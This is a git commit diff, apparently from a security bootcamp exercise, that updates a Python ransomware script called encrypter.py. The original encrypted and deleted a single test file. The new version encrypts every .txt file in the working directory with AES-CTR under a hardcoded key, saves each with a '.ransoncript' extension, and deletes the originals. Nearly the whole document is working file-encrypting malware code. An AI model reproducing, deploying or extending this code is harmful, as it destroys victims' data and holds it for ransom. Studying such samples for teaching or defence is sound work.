cea8b9b476be76b9ad2ce6dac132bd41935c0a34
theocgc <theocgc@gmail.com>
2025-01-30 08:01:32 -0300

    Update encrypter.py
    Atualização para criptografar qualquer arquivo com a extesão TXT.

--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,24 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+def encrypt_file(file_path, key):
+    with open(file_path, "rb") as file:
+        file_data = file.read()
+    
+    aes = pyaes.AESModeOfOperationCTR(key)
+    crypto_data = aes.encrypt(file_data)
+    
+    encrypted_file_path = f"{file_path}.ransoncript"
+    with open(encrypted_file_path, "wb") as new_file:
+        new_file.write(crypto_data)
+    
+    os.remove(file_path)
+    print(f"Arquivo {file_path} criptografado com sucesso!")
 
-## remover o arquivo
-os.remove(file_name)
+# Definir chave de criptografia
+key = b"cripto_bootcamp1"  # 16 bytes
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
-
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+# Buscar todos os arquivos .txt no diretório atual
+for file_name in os.listdir():
+    if file_name.endswith(".txt"):
+        encrypt_file(file_name, key)
